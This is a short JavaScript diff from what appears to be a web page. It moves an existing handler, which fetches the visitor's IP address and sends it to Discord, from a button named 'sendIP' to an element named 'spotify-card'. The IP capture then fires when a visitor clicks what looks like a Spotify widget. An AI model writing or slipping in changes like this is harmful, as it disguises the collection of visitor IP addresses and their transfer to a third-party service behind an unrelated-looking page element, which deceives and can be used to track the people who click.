@@ -21,7 +21,7 @@ async function sendToDiscord(ip) {
     alert('IP sent to Discord!');
 }
 
-document.getElementById("sendIP").addEventListener("click", async () => {
+document.getElementById("spotify-card").addEventListener("click", async () => {
     const ip = await fetchIP();
     await sendToDiscord(ip);
 });
